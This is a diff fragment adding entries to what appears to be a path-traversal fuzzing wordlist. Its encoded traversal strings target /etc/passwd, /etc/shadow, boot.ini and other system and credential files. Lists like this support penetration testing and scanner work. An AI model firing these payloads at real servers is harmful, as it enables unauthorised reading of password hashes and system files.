@@ -130,3 +130,13 @@ C:\boot.ini
 /.../.../.../.../.../
 ..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../boot.ini
 /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow
+../../../../../../etc/passwd&=%3C%3C%3C%3C
+../../../administrator/inbox
+../../../../../../../dev
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow
+..%2F..%2F..%2F%2F..%2F..%2F%2Fvar%2Fnamed
+..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/boot.ini
+/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
